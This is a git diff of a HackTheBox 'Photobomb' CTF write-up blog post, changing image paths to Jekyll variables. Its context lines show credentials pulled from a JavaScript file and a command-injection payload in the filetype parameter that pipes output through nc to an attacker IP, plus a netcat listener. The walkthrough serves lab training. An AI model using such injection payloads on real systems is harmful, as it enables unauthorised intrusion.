@@ -4,9 +4,9 @@ author: yufong
 categories: [HackTheBox, HackTheBox - Linux]
 date: 2022-10-16
 tags: [exploit/command-injection, path-hijacking]
-img_path: /Writeups/HackTheBox/Linux/Photobomb/images/
+img_path: /_posts/Writeups/HackTheBox/Linux/Photobomb/images/
 image:
-  src: Pasted%20image%2020221015154250.png
+  path: /_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015154250.png
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
@@ -42,12 +42,12 @@ After enumerating the system, user `wizard` has a sudoers entry that allows user
 
 ## TCP/80 (HTTP) - /printer (Basic Authentication), Creds Found
 1. Found a password protected directory, `/printer`
-	![](Pasted%20image%2020221015154826.png)
+	![]({{ page.img_path }}Pasted%20image%2020221015154826.png)
 	> Basic Authentication
 	{: .prompt-info}
 
 2. Credentials for the encrypted directory can be in a `.js` file that the page is referencing 
-	![](Pasted%20image%2020221015155326.png)
+	![]({{ page.img_path }}Pasted%20image%2020221015155326.png)
 	```
 	┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
 	└─# curl http://photobomb.htb/photobomb.js
@@ -63,14 +63,14 @@ After enumerating the system, user `wizard` has a sudoers entry that allows user
 	{: .prompt-info}
 
 3. Successfully login w/ `pH0t0:b0Mb!` 
-	![](Pasted%20image%2020221015155819.png)
+	![]({{ page.img_path }}Pasted%20image%2020221015155819.png)
 	> `/printer` allows authenticated users to select an image, change its dimensions, file extension (`.jpg, .png`) and download it.
 	{: .prompt-info}
 
 
 ## TCP/80 (HTTP) - /printer, Command Injection
 1. Download an image, intercept the request w/ `burp`
-	![](Pasted%20image%2020221015160228.png)
+	![]({{ page.img_path }}Pasted%20image%2020221015160228.png)
 	- Parameters: `photo`, `filetype`, `dimensions`
 2. Determine if the parameters are susceptible to SQLi
 	```
@@ -88,13 +88,13 @@ After enumerating the system, user `wizard` has a sudoers entry that allows user
 	- Failed
 3. After some testing, I can conclude that
 	- This is a valid request
-		![](Pasted%20image%2020221015162531.png)
+		![]({{ page.img_path }}Pasted%20image%2020221015162531.png)
 	- `photo` - specify photo name, must match the photo that exists on the webserver, 
-		![](Pasted%20image%2020221015161904.png)
+		![]({{ page.img_path }}Pasted%20image%2020221015161904.png)
 		> any invalid name will cause a `500 Internal Server Error - Source photo does not exist`
 		{: .prompt-info}
 	- `filetype` - specify file type (`jpg`, `png`) only, 
-		![](Pasted%20image%2020221015162415.png)
+		![]({{ page.img_path }}Pasted%20image%2020221015162415.png)
 		> - however we are able to append anything  as long as `jpg` or `png` is infront of the appended text.
 		> - We can see that the request is processed `filename=andrea-de-santis-uCFuP0Gc_MM-unsplash_1x1.jpg testing 123`
 		{: .prompt-info}
@@ -104,7 +104,7 @@ After enumerating the system, user `wizard` has a sudoers entry that allows user
 	# Payload
 	photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg; echo "Vulnerable to Command Injection!" | nc 10.10.14.39 4444&dimensions=1x1
 	```
-	![](Pasted%20image%2020221015163028.png)
+	![]({{ page.img_path }}Pasted%20image%2020221015163028.png)
 	```
 	┌──(root💀kali)-[~/htb/photobomb]
 	└─# nc -nvlp 4444
@@ -311,6 +311,6 @@ After enumerating the system, user `wizard` has a sudoers entry that allows user
 	
 	Command Injection Failed
 	```
-	![](Pasted%20image%2020221023172508.png)
+	![]({{ page.img_path }}Pasted%20image%2020221023172508.png)
 6. Demo - Command Injection Patched
 	![](k77xK9YlC4.gif)
